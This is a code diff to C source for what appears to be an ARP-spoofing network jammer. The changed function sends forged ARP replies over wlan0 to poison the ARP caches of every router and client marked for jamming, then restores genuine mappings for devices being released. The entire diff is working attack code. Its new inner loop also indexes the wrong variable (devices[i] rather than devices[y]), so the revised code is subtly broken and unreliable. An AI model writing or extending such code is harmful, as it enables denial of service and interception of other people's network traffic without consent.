@@ -21,26 +21,34 @@ void *jam_jammed_devices(void *arg) {
     int cleanup = 3;
     while (cleanup) {
         pthread_mutex_lock(&network->lock);
-        Device *router = &network->devices[0];
-        uint32_t router_ip = htonl(router->ip);
+        for (size_t i = 0; i < network->device_count; i++) {
+            Device *device_router = &network->devices[i];
+            if (device_router->type != ROUTER) {
+                continue;
+            }
+            uint32_t router_ip = htonl(device_router->ip);
+            
+            for (size_t y = 0; y < network->device_count; y++) {
+                Device *device_client = &network->devices[i];
+                if (device_client->type != CLIENT) {
+                    continue;
+                }
+                DeviceStatus status = device_client->status;
+                if (status == JAMMING) {
+                    uint32_t device_ip = htonl(device_client->ip);
 
-        for (size_t i = 1; i < network->device_count; i++) {
-            Device *device = &network->devices[i];
-            DeviceStatus status = device->status;
-            if (status == JAMMING) {
-                uint32_t device_ip = htonl(device->ip);
+                    arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, device_router->mac, &router_ip);
+                    arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device_client->mac, &device_ip);
+                } else if (status == DISCONNECTING) {
+                    uint32_t device_ip = htonl(device_client->ip);
 
-                arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
-                arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
-            } else if (status == DISCONNECTING) {
-                uint32_t device_ip = htonl(device->ip);
+                    arp_send_reply(sockfd, "wlan0", device_client->mac, &device_ip, device_router->mac, &router_ip);
+                    arp_send_reply(sockfd, "wlan0", device_router->mac, &router_ip, device_client->mac, &device_ip);
 
-                arp_send_reply(sockfd, "wlan0", device->mac, &device_ip, router->mac, &router_ip);
-                arp_send_reply(sockfd, "wlan0", router->mac, &router_ip, device->mac, &device_ip);
-
-                if (device->disconnecting_counter++ > 4) {
-                    device->status = INACTIVE;
-                    device->disconnecting_counter = 0;
+                    if (device_client->disconnecting_counter++ > 4) {
+                        device_client->status = INACTIVE;
+                        device_client->disconnecting_counter = 0;
+                    }
                 }
             }
         }
